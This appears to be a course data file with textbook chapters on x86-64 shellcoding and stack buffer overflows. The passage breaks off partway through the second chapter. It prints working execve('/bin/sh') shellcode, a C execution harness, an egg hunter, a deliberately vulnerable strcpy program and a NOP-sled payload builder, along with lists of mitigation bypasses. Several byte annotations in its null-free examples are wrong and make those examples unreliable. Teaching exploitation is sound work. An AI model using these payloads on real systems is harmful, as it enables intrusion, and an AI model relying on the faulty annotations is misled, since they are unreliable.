import { Chapter } from '../types';

export const CHAPTERS_LEVEL_8: Chapter[] = [
  {
    "id": 40,
    "slug": "chapter-40-shellcoding-payload-development",
    "level": 8,
    "levelTitle": "Security and Binary Exploitation",
    "title": "Chapter 40: Shellcoding and Payload Development",
    "subtitle": "Crafting Null-Free, Position-Independent x86-64 Machine Code Payloads",
    "learningObjectives": [
      "Understand the fundamentals of shellcode and its role in security exploitation.",
      "Write position-independent shellcode for Linux x86-64.",
      "Eliminate null bytes (0x00) using xor, mov al, and stack manipulations.",
      "Construct execve(\"/bin/sh\", NULL, NULL) in 24 bytes.",
      "Test shellcode using a C execution harness with mmap and PROT_EXEC.",
      "Understand shellcode for different system calls and functions.",
      "Learn techniques for encoding and decoding shellcode.",
      "Understand shellcode restrictions and how to bypass common filters."
    ],
    "prerequisites": [
      "Chapters 1–17"
    ],
    "keyConcepts": [
      "Shellcode: Compact, self-contained machine code designed for injection into vulnerable programs.",
      "Position-independent code: Can execute at any memory address without relocation.",
      "Null bytes (0x00): Terminate string copies, breaking buffer overflow exploits.",
      "Direct system calls: Bypass libc dependencies for reliable execution.",
      "Shellcode restrictions: Size constraints, character restrictions (null, newline, etc.).",
      "Encoding/decoding: XOR, alphanumeric, Unicode encoding to bypass filters.",
      "Egg hunting: Searching for shellcode in memory when injection space is limited.",
      "Shellcode loaders: C harnesses and standalone injectors for testing."
    ],
    "diagramType": "shellcoding",
    "sections": [
      {
        "id": "sec-40-1",
        "title": "40.1 What is Shellcode?",
        "content": "Shellcode is a small piece of machine code used as a payload in software exploitation. The name comes from its traditional purpose: spawning a command shell (like /bin/sh on Linux)."
      },
      {
        "id": "sec-40-1-1",
        "title": "40.1.1 Why Shellcode Matters",
        "content": "• Primary payload for buffer overflow exploits\n• Used in code injection attacks\n• Foundation for understanding binary exploitation\n• Essential for penetration testing and security research"
      },
      {
        "id": "sec-40-1-2",
        "title": "40.1.2 Shellcode Requirements",
        "content": "1. Position-independent: Can execute at any memory address\n2. Null-free: No 0x00 bytes (for string-based vulnerabilities)\n3. Minimal size: Small enough to fit in limited buffer space\n4. No relocations: Doesn't require linker fixups\n5. No external references: Self-contained or uses known addresses"
      },
      {
        "id": "sec-40-1-3",
        "title": "40.1.3 Types of Shellcode",
        "content": "",
        "tableData": {
          "headers": [
            "Type",
            "Purpose",
            "Example"
          ],
          "rows": [
            [
              "Local",
              "Spawn shell on local system",
              "execve(\"/bin/sh\")"
            ],
            [
              "Reverse",
              "Connect back to attacker",
              "connect(), shell"
            ],
            [
              "Bind",
              "Listen for connections",
              "listen(), accept(), shell"
            ],
            [
              "Download",
              "Fetch and execute payload",
              "wget, curl"
            ],
            [
              "Metasploit",
              "Framework payloads",
              "msfvenom output"
            ]
          ]
        }
      },
      {
        "id": "sec-40-1-4",
        "title": "40.1.4 Shellcode Lifecycle",
        "content": "1. Craft shellcode with specific constraints\n2. Inject into target program (overflow, format string, etc.)\n3. Redirect execution to shellcode\n4. Shellcode executes with target's privileges\n5. Attacker gains control (shell, reverse connection, etc.)"
      },
      {
        "id": "sec-40-2",
        "title": "40.2 24-Byte Null-Free execve(\"/bin/sh\") Shellcode",
        "content": "Complete NASM source code and raw byte sequence for spawning a shell:"
      },
      {
        "id": "sec-40-2-1",
        "title": "40.2.1 Code Breakdown",
        "content": "1. XOR EDX, EDX (31 D2) - Set envp = NULL\n2. PUSH RDX (52) - Push null terminator onto stack\n3. MOV RBX, \"/bin/sh\" (48 BB 2F 62 69 6E 2F 73 68) - Load string\n4. PUSH RBX (53) - Push string onto stack\n5. MOV RDI, RSP (48 89 E7) - RDI = pointer to \"/bin/sh\"\n6. XOR ESI, ESI (31 F6) - Set argv = NULL\n7. XOR EAX, EAX (31 C0) - Clear RAX\n8. MOV AL, 59 (B0 3B) - Set syscall number (execve)\n9. SYSCALL (0F 05) - Invoke kernel"
      },
      {
        "id": "sec-40-2-2",
        "title": "40.2.2 Why This Works",
        "content": "• String \"/bin/sh\" is pushed onto stack (null-terminated by RDX=0)\n• RDI points to the string (first argument to execve)\n• argv = NULL (second argument)\n• envp = NULL (third argument)\n• System call 59 = execve on x86-64 Linux"
      },
      {
        "id": "sec-40-2-3",
        "title": "40.2.3 Testing with C Harness",
        "content": "The C harness allocates executable memory, copies shellcode, and jumps to it. This is safer than testing in actual exploits."
      },
      {
        "id": "sec-40-2-4",
        "title": "40.2.4 Raw Bytes",
        "content": "The shellcode is 24 bytes total. No null bytes (0x00) appear in the machine code."
      },
      {
        "id": "sec-40-2-5",
        "title": "40.2.5 Alternative Strings",
        "content": "Instead of \"/bin/sh\", you can use:\n• \"/bin/bash\" (9 bytes + null)\n• \"/bin/sh\u0000\" (8 bytes)\n• Use a different approach to avoid null in string"
      },
      {
        "id": "sec-40-2-6",
        "title": "40.2.6 Code examples",
        "content": "",
        "codeSnippets": [
          {
            "language": "nasm",
            "title": "shellcode.asm",
            "code": "; execve(\"/bin/sh\", NULL, NULL) - 24 bytes, 0 nulls!\nsection .text\n    global _start\n\n_start:\n    xor edx, edx              ; envp = NULL (31 D2)\n    push rdx                  ; null terminator on stack (52)\n    mov rbx, 0x68732f6e69622f ; \"/bin/sh\" in little-endian (48 BB 2F 62 69 6E 2F 73 68)\n    push rbx                  ; (53)\n    mov rdi, rsp              ; rdi = pointer to \"/bin/sh\" (48 89 E7)\n    xor esi, esi              ; argv = NULL (31 F6)\n    xor eax, eax              ; (31 C0)\n    mov al, 59                ; sys_execve (B0 3B)\n    syscall                   ; (0F 05)"
          },
          {
            "language": "c",
            "title": "C Testing Harness",
            "code": "#include <stdio.h>\n#include <string.h>\n#include <sys/mman.h>\n\nunsigned char shellcode[] = {\n    0x31, 0xd2, 0x52, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68,\n    0x53, 0x48, 0x89, 0xe7, 0x31, 0xf6, 0x31, 0xc0, 0xb0, 0x3b, 0x0f, 0x05\n};\n\nint main() {\n    printf(\"Shellcode length: %zu bytes\\n\", sizeof(shellcode));\n    \n    void *mem = mmap(NULL, sizeof(shellcode), \n                     PROT_READ | PROT_WRITE | PROT_EXEC,\n                     MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);\n    \n    if (mem == MAP_FAILED) {\n        perror(\"mmap\");\n        return 1;\n    }\n    \n    memcpy(mem, shellcode, sizeof(shellcode));\n    \n    printf(\"Shellcode at: %p\\n\", mem);\n    printf(\"Executing shellcode...\\n\");\n    \n    ((void (*)())mem)();\n    \n    return 0;\n}"
          },
          {
            "language": "bash",
            "title": "Compile and Test",
            "code": "# Assemble shellcode\nnasm -f elf64 shellcode.asm -o shellcode.o\nld shellcode.o -o shellcode\n\n# Extract raw bytes\nobjdump -d shellcode | grep '[0-9a-f]:' | \\\n    grep -v 'file' | cut -f2 -d: | \\\n    cut -d' ' -f1-7 | tr -s ' ' | \\\n    tr ' ' '\\n' | grep -v '^$' | \\\n    sed 's/^/0x/' | paste -sd ',' -\n# Output: 0x31,0xd2,0x52,0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x53,0x48,0x89,0xe7,0x31,0xf6,0x31,0xc0,0xb0,0x3b,0x0f,0x05\n\n# Compile test harness\ngcc -o harness harness.c -z execstack\n./harness"
          }
        ]
      },
      {
        "id": "sec-40-3",
        "title": "40.3 Null-Free Techniques",
        "content": "Eliminating null bytes (0x00) is critical for many exploit scenarios."
      },
      {
        "id": "sec-40-3-1",
        "title": "40.3.1 Why Null Bytes are Problematic",
        "content": "String functions like strcpy(), gets(), and sprintf() treat 0x00 as the null terminator. If shellcode contains null bytes, the copy stops early, truncating the payload."
      },
      {
        "id": "sec-40-3-2",
        "title": "40.3.2 Technique 1: XOR Zeroing",
        "content": "Instead of mov eax, 0, use xor eax, eax to zero a register without null bytes."
      },
      {
        "id": "sec-40-3-3",
        "title": "40.3.3 Technique 2: Sub-Register Writes",
        "content": "Instead of mov al, 59 (which may contain null in upper bytes), use xor eax, eax; mov al, 59."
      },
      {
        "id": "sec-40-3-4",
        "title": "40.3.4 Technique 3: Stack Construction",
        "content": "Push values onto the stack byte-by-byte or use PUSH with immediate values."
      },
      {
        "id": "sec-40-3-5",
        "title": "40.3.5 Technique 4: Arithmetic",
        "content": "Use ADD, SUB, or XOR to construct values dynamically."
      },
      {
        "id": "sec-40-3-6",
        "title": "40.3.6 Technique 5: Memory References",
        "content": "Use known addresses that don't contain null bytes."
      },
      {
        "id": "sec-40-3-7",
        "title": "40.3.7 Common Patterns",
        "content": "",
        "tableData": {
          "headers": [
            "Problem",
            "Solution",
            "Example"
          ],
          "rows": [
            [
              "Zero register",
              "XOR",
              "xor eax, eax"
            ],
            [
              "Small constant",
              "Sub-register",
              "mov al, 59"
            ],
            [
              "String with null",
              "Stack push",
              "push rdx (0)"
            ],
            [
              "Negative values",
              "Two's complement",
              "mov al, -1"
            ],
            [
              "Large values",
              "Arithmetic",
              "xor eax, eax; bswap eax"
            ]
          ]
        }
      },
      {
        "id": "sec-40-3-8",
        "title": "40.3.8 Checking for Null Bytes",
        "content": "Use objdump or xxd to examine raw bytes:",
        "codeSnippets": [
          {
            "title": "Checking for Null Bytes — example",
            "language": "bash",
            "code": "objdump -d shellcode | grep -E \"00[^0-9a-f]\""
          }
        ]
      },
      {
        "id": "sec-40-3-9",
        "title": "40.3.9 Encoding Shellcode",
        "content": "If null bytes are unavoidable, use encoding:\n1. XOR encode: XOR each byte with key\n2. Alphanumeric: Only use [a-zA-Z0-9] characters\n3. Unicode: Use UTF-16 encoding\n4. Custom decoder: Add decoder stub before encoded shellcode"
      },
      {
        "id": "sec-40-3-10",
        "title": "40.3.10 Code examples",
        "content": "",
        "codeSnippets": [
          {
            "language": "nasm",
            "title": "Null-Free Examples",
            "code": "; BAD: Contains null bytes\nmov eax, 0          ; B8 00 00 00 00 (null bytes!)\nmov ebx, 0x68732f6e ; BB 68 73 2F 6E 00 00 00 (null bytes!)\n\n; GOOD: No null bytes\nxor eax, eax        ; 31 C0\nmov al, 59          ; B0 3B\n\n; Construct \"/bin/sh\" without null\nxor edx, edx        ; 31 D2\npush rdx            ; 52 (null terminator)\nmov rbx, 0x68732f6e69622f  ; 48 BB 2F 62 69 6E 2F 73 68\npush rbx            ; 53\n\n; Alternative: Build string byte-by-byte\nxor eax, eax        ; 31 C0\npush rax            ; 50 (null terminator)\npush 0x68732f6e     ; 68 6E 2F 73 68\npush 0x69622f       ; 68 2F 62 69 6E\nmov rdi, rsp        ; 48 89 E7"
          }
        ]
      },
      {
        "id": "sec-40-4",
        "title": "40.4 Position-Independent Code (PIC)",
        "content": "Shellcode must be position-independent because injection targets vary."
      },
      {
        "id": "sec-40-4-1",
        "title": "40.4.1 What is PIC?",
        "content": "Code that can execute correctly regardless of its memory address. No absolute addresses, no relocations."
      },
      {
        "id": "sec-40-4-2",
        "title": "40.4.2 PIC Requirements",
        "content": "1. No absolute memory references\n2. No global variables (unless address-independent)\n3. No function calls with absolute addresses\n4. Use RIP-relative addressing or stack-based techniques"
      },
      {
        "id": "sec-40-4-3",
        "title": "40.4.3 x86-64 PIC Techniques",
        "content": "1. Stack-based: Push values, use RSP as reference\n2. RIP-relative: Address = RIP + displacement (default in 64-bit)\n3. Self-modifying code: Calculate address at runtime\n4. Syscalls: Use syscall instruction instead of libc calls"
      },
      {
        "id": "sec-40-4-4",
        "title": "40.4.4 Position-Independent Shellcode Example",
        "content": "The 24-byte execve shellcode is position-independent:\n• Uses stack for string construction\n• Uses registers for arguments\n• No absolute addresses\n• Works at any memory location"
      },
      {
        "id": "sec-40-4-5",
        "title": "40.4.5 Testing PIC",
        "content": "1. Compile as shared library\n2. Load at different addresses\n3. Execute from each address\n4. Verify correct behavior"
      },
      {
        "id": "sec-40-4-6",
        "title": "40.4.6 Common PIC Mistakes",
        "content": "1. Using absolute addresses for strings\n2. Calling functions with absolute addresses\n3. Using global variables\n4. Assuming specific memory layout"
      },
      {
        "id": "sec-40-4-7",
        "title": "40.4.7 Code examples",
        "content": "",
        "codeSnippets": [
          {
            "language": "nasm",
            "title": "PIC Shellcode Example",
            "code": "; Position-independent shellcode example\n; Uses stack for string, no absolute addresses\n\nsection .text\n    global _start\n\n_start:\n    ; Zero a register (no null bytes)\n    xor eax, eax\n    \n    ; Push null terminator\n    push rax\n    \n    ; Push \"/bin/sh\" string\n    ; (assembled from bytes, not string literal)\n    mov rbx, 0x68732f6e69622f\n    push rbx\n    \n    ; RDI = pointer to string\n    mov rdi, rsp\n    \n    ; Set up arguments\n    xor esi, esi    ; argv = NULL\n    xor edx, edx    ; envp = NULL\n    \n    ; execve syscall\n    mov al, 59\n    syscall"
          }
        ]
      },
      {
        "id": "sec-40-5",
        "title": "40.5 Shellcode Restrictions and Bypasses",
        "content": "Real-world shellcode must often bypass various security filters."
      },
      {
        "id": "sec-40-5-1",
        "title": "40.5.1 Common Restrictions",
        "content": "",
        "tableData": {
          "headers": [
            "Restriction",
            "Bypass Technique"
          ],
          "rows": [
            [
              "Null bytes (0x00)",
              "XOR zeroing, sub-register writes"
            ],
            [
              "Newlines (0x0A)",
              "XOR with 0x0A, stack construction"
            ],
            [
              "Spaces (0x20)",
              "Use tabs or other whitespace"
            ],
            [
              "Alphanumeric only",
              "Alphanumeric shellcode, decoder stubs"
            ],
            [
              "Unicode safe",
              "UTF-16 encoding, ASCII expansion"
            ],
            [
              "Size limits",
              "Optimize, use encoder/decoder"
            ],
            [
              "Bad characters",
              "Custom encoding scheme"
            ]
          ]
        }
      },
      {
        "id": "sec-40-5-2",
        "title": "40.5.2 Alphanumeric Shellcode",
        "content": "Only uses characters A-Z, a-z, 0-9. Requires a decoder stub:\n1. Decoder stub (alphanumeric) decodes payload\n2. Payload is XOR or ROL encoded\n3. Decoded payload executes"
      },
      {
        "id": "sec-40-5-3",
        "title": "40.5.3 Egg Hunter",
        "content": "When injection space is small:\n1. Use small \"egg hunter\" code (30-50 bytes)\n2. Egg hunter searches memory for larger shellcode\n3. Larger shellcode marked with \"egg\" (e.g., 0xDEADC0DE)"
      },
      {
        "id": "sec-40-5-4",
        "title": "40.5.4 Custom Encoders",
        "content": "For highly restricted environments:\n1. Identify allowed characters\n2. Design encoding scheme using only those characters\n3. Write decoder stub in allowed character set\n4. Encode payload and prepend decoder"
      },
      {
        "id": "sec-40-5-5",
        "title": "40.5.5 Shellcode Analysis Tools",
        "content": "",
        "tableData": {
          "headers": [
            "Tool",
            "Purpose"
          ],
          "rows": [
            [
              "libdisasm",
              "Disassemble shellcode"
            ],
            [
              "sctest",
              "Execute shellcode safely"
            ],
            [
              "shellcode.com",
              "Online shellcode database"
            ],
            [
              "msfvenom",
              "Generate shellcode payloads"
            ],
            [
              "pwntools",
              "Python exploit development library"
            ]
          ]
        }
      },
      {
        "id": "sec-40-5-6",
        "title": "40.5.6 Code examples",
        "content": "",
        "codeSnippets": [
          {
            "language": "nasm",
            "title": "Egg Hunter Example",
            "code": "; Egg hunter: searches for 0xDEADC0DE marker\nsection .text\n    global _start\n\n_start:\n    xor ecx, ecx        ; start address\n    mov ebx, 0xDEADC0DE ; egg value\n\n.next_page:\n    or cx, 0xFFF        ; page alignment\n.inc_addr:\n    inc rcx             ; next address\n    push rbx            ; save egg\n    pop rax\n    cmp dword [rcx], eax ; check for egg\n    jne .inc_addr\n    cmp dword [rcx+4], eax ; check second egg\n    jne .inc_addr\n    \n    ; Found egg! Jump to shellcode after eggs\n    lea rax, [rcx+8]\n    jmp rax"
          }
        ]
      }
    ],
    "exercises": [
      {
        "id": "ex-40-1",
        "title": "Exercise 40.1: Null-Free exit(42)",
        "description": "Construct null-free machine code to call exit(42) in 11 bytes.",
        "solution": "xor edi, edi\nmov dil, 42         ; exit code 42\nxor eax, eax\nmov al, 60          ; sys_exit\nsyscall",
        "solutionLanguage": "nasm"
      },
      {
        "id": "ex-40-2",
        "title": "Exercise 40.2: Write Shellcode",
        "description": "Write a null-free shellcode that writes \"Hello\\n\" to stdout using write syscall.",
        "solution": "Use write syscall (1). Push \"Hello\\n\" onto stack, set RDI=1 (stdout), RSI=RSP (buffer), RDX=6 (length). syscall number 1.",
        "solutionLanguage": "nasm"
      },
      {
        "id": "ex-40-3",
        "title": "Exercise 40.3: Null-Free String Construction",
        "description": "Construct the string \"/etc/passwd\" on the stack without null bytes.",
        "solution": "Push 0 (null terminator) with xor rax,rax; push rax. Then push parts of string: \"dwp\" -> \"ssap/\" -> \"cte/\". Use mov rdi, rsp for pointer.",
        "solutionLanguage": "nasm"
      },
      {
        "id": "ex-40-4",
        "title": "Exercise 40.4: Shellcode Size Optimization",
        "description": "Optimize the execve shellcode to under 20 bytes if possible.",
        "solution": "Use shorter instructions: xor esi, esi (2 bytes) vs mov rsi, 0 (7 bytes). Use sub-register writes. Avoid unnecessary instructions. Can achieve ~21 bytes minimum.",
        "solutionLanguage": "nasm"
      },
      {
        "id": "ex-40-5",
        "title": "Exercise 40-5: Alphanumeric Shellcode",
        "description": "Write a simple alphanumeric decoder that XOR-decodes and executes payload.",
        "solution": "Use only alphanumeric characters in decoder. Decoder reads ahead, XORs each byte with key (e.g., 0x41), stores decoded byte, then jumps to decoded region.",
        "solutionLanguage": "nasm"
      }
    ],
    "practiceQuestions": [
      {
        "question": "Why must shellcode avoid null bytes (0x00)?",
        "answer": "Because many buffer overflow vulnerabilities occur in string functions like strcpy or gets, which treat 0x00 as the end-of-string delimiter, truncating the payload upon copying. Null bytes in shellcode would prevent the full payload from being copied into the target buffer."
      },
      {
        "question": "What is position-independent code (PIC) and why is it important for shellcode?",
        "answer": "PIC is code that can execute correctly at any memory address without relocation. Shellcode must be PIC because injection targets vary - the attacker cannot predict exactly where in memory the shellcode will end up. PIC uses no absolute addresses, only relative references and stack-based techniques."
      },
      {
        "question": "How do you test shellcode safely?",
        "answer": "Use a C harness with mmap to allocate executable memory, copy shellcode, and jump to it. This avoids executing shellcode in actual exploits during development. Tools like sctest and shellcode emulators also provide safe testing environments."
      },
      {
        "question": "What are the main types of shellcode and their purposes?",
        "answer": "Local shellcode spawns a shell on the target system. Reverse shell connects back to attacker. Bind shell listens for connections. Download shellcode fetches and executes additional payloads. Each type serves different exploitation scenarios depending on network access and target configuration."
      },
      {
        "question": "How do egg hunters work and when are they needed?",
        "answer": "Egg hunters are small shellcode stubs (30-50 bytes) that search memory for a larger shellcode payload marked with a unique marker (egg). They are needed when injection space is too small for the full payload but the attacker can influence memory contents elsewhere in the target process."
      },
      {
        "question": "What encoding techniques are used for shellcode?",
        "answer": "Common encoding techniques include: XOR encoding (XOR each byte with a key), alphanumeric encoding (only A-Z, a-z, 0-9 characters), Unicode encoding (UTF-16 expansion), and custom encoders. Each adds a decoder stub before the encoded payload."
      }
    ],
    "summary": [
      "Shellcode delivers compact, self-contained machine code execution.",
      "Null avoidance requires register zeroing and sub-register writes.",
      "Position-independent code uses no absolute addresses.",
      "Direct syscalls bypass libc dependencies for reliability.",
      "Shellcode must be tested with C harnesses for safety.",
      "Encoding techniques bypass character restrictions.",
      "Egg hunters enable exploitation with limited injection space.",
      "Understanding shellcode is essential for security research and defense."
    ]
  },
  {
    "id": 41,
    "slug": "chapter-41-buffer-overflows-memory-corruption",
    "level": 8,
    "levelTitle": "Security and Binary Exploitation",
    "title": "Chapter 41: Buffer Overflows and Memory Corruption",
    "subtitle": "Stack Smashing, RIP Hijacking, NOP Sleds, and Mitigations (Canaries, NX, ASLR)",
    "learningObjectives": [
      "Understand the fundamentals of buffer overflow vulnerabilities.",
      "Understand how buffer overflows overwrite saved stack frames and return addresses.",
      "Analyze stack layout and identify vulnerable functions.",
      "Calculate precise payload padding using GDB stack examination.",
      "Construct a NOP sled to improve shellcode jump reliability.",
      "Identify modern defensive mitigations: Stack Canaries, NX/DEP, ASLR, and PIE.",
      "Understand different types of buffer overflows (stack, heap, integer).",
      "Learn exploit development methodology and best practices."
    ],
    "prerequisites": [
      "Chapters 1–40"
    ],
    "keyConcepts": [
      "Buffer overflow: Writing past the end of a buffer, overwriting adjacent memory.",
      "Stack smashing: Overwriting saved return address to hijack control flow.",
      "NOP sled (0x90): Provides a forgiving landing pad for shellcode execution.",
      "NX/DEP (No-Execute): Prevents execution of code in stack/heap pages.",
      "Stack canaries: Random values placed before return address to detect overflows.",
      "ASLR: Randomizes memory layout to prevent predictable addresses.",
      "PIE (Position-Independent Executable): Randomizes code segment base address.",
      "ROP (Return-Oriented Programming): Code reuse technique to bypass NX."
    ],
    "diagramType": "buffer_overflow",
    "sections": [
      {
        "id": "sec-41-1",
        "title": "41.1 Understanding Buffer Overflows",
        "content": "Buffer overflows occur when a program writes more data to a buffer than it can hold, corrupting adjacent memory."
      },
      {
        "id": "sec-41-1-1",
        "title": "41.1.1 Types of Buffer Overflows",
        "content": "",
        "tableData": {
          "headers": [
            "Type",
            "Location",
            "Exploitation"
          ],
          "rows": [
            [
              "Stack-based",
              "Local variables on stack",
              "Overwrite saved RIP"
            ],
            [
              "Heap-based",
              "Dynamic memory (malloc)",
              "Overwrite function pointers"
            ],
            [
              "Integer",
              "Arithmetic operations",
              "Cause unexpected allocations"
            ],
            [
              "Format string",
              "printf/sprintf",
              "Read/write arbitrary memory"
            ],
            [
              "Use-after-free",
              "Freed heap memory",
              "Overwrite freed object"
            ]
          ]
        }
      },
      {
        "id": "sec-41-1-2",
        "title": "41.1.2 Stack Buffer Overflow Anatomy",
        "content": "High Address\n┌─────────────────────┐\n│   Function Args     │\n├─────────────────────┤\n│   Return Address    │ ← Overwritten to shellcode\n├─────────────────────┤\n│   Saved RBP         │ ← Overwritten\n├─────────────────────┤\n│   Local Variables   │ ← Buffer starts here\n│   [Buffer]          │ ← Overflow happens here\n│                     │\n└─────────────────────┘\nLow Address"
      },
      {
        "id": "sec-41-1-3",
        "title": "41.1.3 Why Stack Overflows Occur",
        "content": "1. No bounds checking on input functions\n2. Trusting user input without validation\n3. Using unsafe C functions (strcpy, gets, sprintf)\n4. Off-by-one errors in loop bounds"
      },
      {
        "id": "sec-41-1-4",
        "title": "41.1.4 Impact of Buffer Overflows",
        "content": "• Arbitrary code execution\n• Denial of service\n• Information disclosure\n• Privilege escalation\n• System compromise"
      },
      {
        "id": "sec-41-1-5",
        "title": "41.1.5 Common Vulnerable Functions",
        "content": "",
        "tableData": {
          "headers": [
            "Function",
            "Risk",
            "Safer Alternative"
          ],
          "rows": [
            [
              "strcpy()",
              "No bounds check",
              "strncpy()"
            ],
            [
              "gets()",
              "No bounds at all",
              "fgets()"
            ],
            [
              "sprintf()",
              "No format limits",
              "snprintf()"
            ],
            [
              "strcat()",
              "No bounds check",
              "strncat()"
            ],
            [
              "scanf()",
              "Width not enforced",
              "Use %ns with width"
            ]
          ]
        }
      },
      {
        "id": "sec-41-1-6",
        "title": "41.1.6 Code examples",
        "content": "",
        "codeSnippets": [
          {
            "language": "c",
            "title": "Vulnerable Code Example",
            "code": "#include <stdio.h>\n#include <string.h>\n\nvoid vulnerable_function(char *input) {\n    char buffer[64];\n    \n    // VULNERABLE: No bounds checking!\n    strcpy(buffer, input);\n    \n    printf(\"Buffer: %s\\n\", buffer);\n}\n\nint main(int argc, char *argv[]) {\n    if (argc > 1) {\n        vulnerable_function(argv[1]);\n    }\n    return 0;\n}"
          }
        ]
      },
      {
        "id": "sec-41-2",
        "title": "41.2 Crafting the Stack Exploit Payload",
        "content": "The exploit payload must precisely overflow the buffer to overwrite the return address."
      },
      {
        "id": "sec-41-2-1",
        "title": "41.2.1 Payload Structure",
        "content": "[NOP Sled] [Shellcode] [Padding] [Return Address]\n   ↓           ↓           ↓           ↓\n 0x90      Actual code   'A' * N    Address into sled"
      },
      {
        "id": "sec-41-2-2",
        "title": "41.2.2 Calculating the Offset",
        "content": "1. Use GDB to examine stack layout\n2. Find distance from buffer start to saved RIP\n3. Pattern: Buffer size + alignment + saved RBP = offset to RIP"
      },
      {
        "id": "sec-41-2-3",
        "title": "41.2.3 NOP Sled Purpose",
        "content": "• Provides a \"landing pad\" for imprecise jumps\n• Instead of jumping to exact shellcode address, jump anywhere in sled\n• Each 0x90 byte slides to next instruction\n• Larger sled = easier exploitation but more space needed"
      },
      {
        "id": "sec-41-2-4",
        "title": "41.2.4 Return Address Calculation",
        "content": "• Must point into NOP sled (not shellcode)\n• Account for ASLR (if disabled or bypassed)\n• Consider stack alignment (16-byte for x86-64)"
      },
      {
        "id": "sec-41-2-5",
        "title": "41.2.5 GDB Analysis Commands",
        "content": "• info frame: Show stack frame layout\n• x/20x $rsp: Examine stack memory\n• pattern_create/pattern_offset: Find exact offset\n• disassemble function: Find vulnerable function"
      },
      {
        "id": "sec-41-2-6",
        "title": "41.2.6 Exploit Reliability",
        "content": "• Use NOP sled for variance tolerance\n• Consider heap/stack layout variations\n• Account for environment variables on stack\n• Test with different input sizes"
      },
      {
        "id": "sec-41-2-7",
        "title": "41.2.7 Code examples",
        "content": "",
        "codeSnippets": [
          {
            "language": "python",
            "title": "exploit_payload.py",
            "code": "import struct\nimport sys\n\n# 24-byte execve(\"/bin/sh\") shellcode\nshellcode = (\n    b\"\\x31\\xd2\\x52\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\"\n    b\"\\x53\\x48\\x89\\xe7\\x31\\xf6\\x31\\xc0\\xb0\\x3b\\x0f\\x05\"\n)\n\n# Payload construction\noffset = 72           # 64-byte buffer + 8-byte saved RBP\nnop_sled = b\"\\x90\" * 40\npadding = b\"A\" * (offset - len(nop_sled) - len(shellcode))\nreturn_addr = struct.pack(\"<Q\", 0x7fffffffe020 + 10)\n\npayload = nop_sled + shellcode + padding + return_addr\n\nprint(f\"Payload length: {len(payload)} bytes\")\nprint(f\"NOP sled: {len(nop_sled)} bytes\")\nprint(f\"Shellcode: {len(shellcode)} bytes\")\nprint(f\"Padding: {len(padding)} bytes\")\n\n# Write to file\nwith open(\"payload.bin\", \"wb\") as f:\n    f.write(payload)\n\nprint(\"Payload written to payload.bin\")"
          }
        ]
      },
      {
        "id": "sec-41-3",
        "title": "41.3 Modern Exploit Mitigations",
        "content": "Modern systems employ multiple layers of defense against buffer overflows."
      },
      {
        "id": "sec-41-3-1",
        "title": "41.3.1 Stack Canaries",
        "content": "• Random value placed before saved return address\n• Checked before function return\n• If corrupted, __stack_chk_fail() terminates program\n• Defeated by: Information leak, brute force, format string"
      },
      {
        "id": "sec-41-3-2",
        "title": "41.3.2 NX/DEP (No-Execute/Data Execution Prevention)",
        "content": "• Marks stack and heap as non-executable\n• Prevents execution of injected shellcode\n• Defeated by: ROP, ret2libc, JIT spraying"
      },
      {
        "id": "sec-41-3-3",
        "title": "41.3.3 ASLR (Address Space Layout Randomization)",
        "content": "• Randomizes base addresses of:\n  - Stack\n  - Heap\n  - Shared libraries (libc)\n  - Executable (with PIE)\n• Defeated by: Information leak, brute force, partial overwrite"
      },
      {
        "id": "sec-41-3-4",
        "title": "41.3.4 PIE (Position-Independent Executable)",
        "content": "• Randomizes code segment base address\n• Combined with ASLR for full randomization\n• Defeated by: Information leak of code addresses"
      },
      {
        "id": "sec-41-3-5",
        "title": "41.3.5 RELRO (Relocation Read-Only)",
        "content": "• Makes GOT read-only after dynamic linking\n• Partial RELRO: GOT writable (default)\n• Full RELRO: GOT read-only ( harder to exploit)"
      },
      {
        "id": "sec-41-3-6",
        "title": "41.3.6 CFI (Control-Flow Integrity)",
        "content": "• Validates indirect call/jump targets\n• Prevents ROP/JOP attacks\n• Implementation: LLVM CFI, Intel CET"
      },
      {
        "id": "sec-41-3-7",
        "title": "41.3.7 Mitigation Bypass Techniques",
        "content": "",
        "tableData": {
          "headers": [
            "Mitigation",
            "Bypass Technique"
          ],
          "rows": [
            [
              "NX/DEP",
              "ROP, ret2libc"
            ],
            [
              "ASLR",
              "Info leak, brute force"
            ],
            [
              "Canaries",
              "Leak canary value"
            ],
            [
              "PIE",
              "Leak code address"
            ],
            [
              "RELRO",
              "Use data-only attacks"
            ]
          ]
        }
      },
      {
        "id": "sec-41-3-8",
        "title": "41.3.8 Code examples",
        "content": "",
        "codeSnippets": [
          {
            "language": "bash",
            "title": "Checking Protections",
            "code": "# Check binary protections\nchecksec --file=vulnerable_binary\n\n# Or with readelf\nreadelf -l vulnerable_binary | grep GNU_STACK\n# NX enabled if no EXEC flag\n\n# Check ASLR status\ncat /proc/sys/kernel/randomize_va_space\n# 0 = disabled, 1 = partial, 2 = full\n\n# Disable ASLR (requires root)\necho 0 | sudo tee /proc/sys/kernel/randomize_va_space\n\n# Compile with protections\ngcc -o vuln vuln.c -fstack-protector-strong  # Stack canary\ngcc -o vuln vuln.c -z noexecstack            # NX enabled\ngcc -o vuln vuln.c -pie -fPIE                # PIE enabled\ngcc -o vuln vuln.c -z relro -z now           # Full RELRO"
          }
        ]
      },
      {
        "id": "sec-41-4",
        "title": "41.4 Exploit Development Methodology",
        "content": "Professional exploit development follows a systematic approach."
      },
      {
        "id": "sec-41-4-1",
        "title": "41.4.1 Step-by-Step Methodology",
        "content": "1. Identify Vulnerability: Find buffer overflow in source/binary\n2. Determine Offset: Calculate exact distance to return address\n3. Control EIP/RIP: Verify you can overwrite return address\n4. Find Buffer Address: Locate where shellcode will land\n5. Craft Payload: Build exploit with NOP sled + shellcode\n6. Bypass Mitigations: Address NX, ASLR, canaries as needed\n7. Test Exploit: Verify reliable code execution\n8. Document: Record findings and exploitation path"
      },
      {
        "id": "sec-41-4-2",
        "title": "41.4.2 GDB Workflow",
        "content": "1. Run program with pattern input\n2. Analyze crash (info registers, backtrace)\n3. Find offset with pattern_create/pattern_offset\n4. Verify control of instruction pointer\n5. Test shellcode execution"
      },
      {
        "id": "sec-41-4-3",
        "title": "41.4.3 Exploit Reliability Factors",
